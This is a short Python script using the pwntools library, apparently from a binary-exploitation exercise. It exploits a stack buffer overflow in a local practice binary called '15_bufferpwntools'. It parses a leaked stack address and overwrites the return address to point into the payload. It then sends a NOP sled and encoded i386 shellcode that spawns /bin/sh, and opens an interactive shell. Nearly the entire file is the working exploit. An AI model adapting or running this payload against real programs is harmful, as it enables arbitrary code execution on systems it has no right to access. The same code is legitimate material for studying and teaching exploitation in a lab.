from pwn import *

context.update(arch="i386", os="linux")
shellcode = shellcraft.sh()
print(shellcode)


# This is to start a process and attach to it
p = process("./15_bufferpwntools")
# gdb.attach(p, '''
# b printf
# ''')

# This is to start it purely in GDB
# p = gdb.debug("./15_bufferpwntools", '''
# init-pwndbg
# b main
# continue
# ''')
msg = p.recvuntil(b'overflows:\n')
print(msg)
msg = msg.decode()
cup = int(msg.split(" ")[1].split("\n")[0], 16)
print(f"Setting payload to: {hex(cup + 36)}")
# Padding
payload = cyclic(32)

# This is pointer for buffer on stack + 36 which is after the retadd
payload += p32(cup + 36)
payload += b'\x90' * 10
payload += encoders.encoder.encode(asm(shellcode),
        avoid=b'\x09\x0a\x0b\x0c\x0d\x20')
print(payload)
p.sendline(payload)
p.interactive()
